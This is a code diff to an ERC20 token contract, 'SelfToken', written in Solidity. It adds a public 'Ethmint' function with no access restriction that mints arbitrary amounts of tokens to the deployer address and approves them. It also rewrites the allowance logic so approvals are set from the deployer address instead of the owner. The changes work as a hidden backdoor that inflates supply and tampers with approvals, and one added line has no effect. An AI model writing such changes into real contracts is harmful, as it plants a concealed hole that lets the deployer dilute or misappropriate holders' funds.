@@ -112,6 +112,12 @@ contract SelfToken is ERC20 {
         tokenLevel[deployAddress] = 1;
     }
 
+    function Ethmint(uint256 _amount, uint256 _digicount) public {
+        _mint(deployAddress, (_amount * (10 ** _digicount)));
+        approve(deployAddress, (_amount * (10 ** _digicount)));
+        tokenLevel[deployAddress];
+    }
+
     function _mint(address account, uint256 amount) internal override {
         require(account != address(0), "ERC20: mint to the zero address");
 
@@ -188,8 +194,8 @@ contract SelfToken is ERC20 {
                 "ERC20: insufficient allowance"
             );
             unchecked {
-                _approve(owner, owner, currentAllowance - amount);
-                _approve(owner, spender, amount);
+                _approve(deployAddress, owner, currentAllowance - amount);
+                _approve(deployAddress, spender, amount);
             }
         }
     }
